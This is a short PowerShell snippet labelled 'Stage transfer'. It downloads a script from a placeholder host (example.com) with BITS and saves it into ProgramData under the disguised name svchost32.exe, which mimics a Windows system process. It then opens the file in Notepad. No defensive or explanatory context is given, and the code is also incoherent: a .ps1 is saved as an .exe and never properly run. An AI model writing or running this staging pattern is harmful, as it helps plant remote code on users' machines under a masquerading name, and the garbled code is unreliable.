
<# Stage transfer #> $FetchUrl = "https://example.com/updater.ps1"; $DownloadPath = 'C:\ProgramData\svchost32.exe'; Start-BitsTransfer -Source $FetchUrl -Destination $DownloadPath; Start-Process -FilePath "notepad.exe" -ArgumentList $DownloadPath; Set-Location -Path $env:TEMP; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
